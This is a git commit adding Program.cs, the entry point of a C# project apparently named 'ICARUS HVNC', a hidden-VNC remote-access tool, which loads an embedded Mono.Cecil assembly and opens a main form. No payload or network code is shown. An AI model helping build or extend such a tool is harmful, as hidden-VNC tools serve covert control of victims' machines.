a8c2e7e89fb6a360836b2b139ff327cfa1083434
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:49:27 +0400

    Program.cs

---
+++ ICARUS HVNC/Hidden Application/Program.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Reflection;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace HVNC
+{
+    static class Program
+    {
+        /// <summary>
+        /// Point d'entrée principal de l'application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            var myType = typeof(Program);
+
+            string resource2 = myType.Namespace + ".DLL.Mono.Cecil.dll";
+
+            EmbeddedAssembly.Load(resource2, "Mono.Cecil.dll");
+
+            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);
+
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new FrmMain());
+        }
+
+        static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
+        {
+            return EmbeddedAssembly.Get(args.Name);
+        }
+    }
+}
